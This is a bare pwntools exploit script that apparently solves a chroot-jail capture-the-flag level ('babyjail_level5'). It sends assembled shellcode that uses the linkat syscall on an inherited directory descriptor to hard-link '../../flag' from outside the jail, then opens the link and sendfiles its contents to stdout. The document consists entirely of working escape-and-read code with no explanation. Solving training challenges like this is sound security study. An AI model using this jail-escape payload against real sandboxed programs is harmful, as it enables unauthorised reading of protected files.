from pwn import *
context.arch='amd64'
r = process(['/challenge/babyjail_level5','/'])
#r = process(['sudo','strace','/challenge/babyjail_level5','/'])
payload = asm(
'''

    push 0x6761
    mov rcx, 0x6c662f2e2e2f2e2e
    push rcx

    push  0x662f

    mov rax, 265
    mov rdi, 3
    lea rsi, [rsp+8]
    mov rdx, 0
    mov r10, rsp
    mov r8, 0
    syscall


    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rsi, rax
    mov rdi, 1
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall

'''
)

r.send(payload)
r.interactive()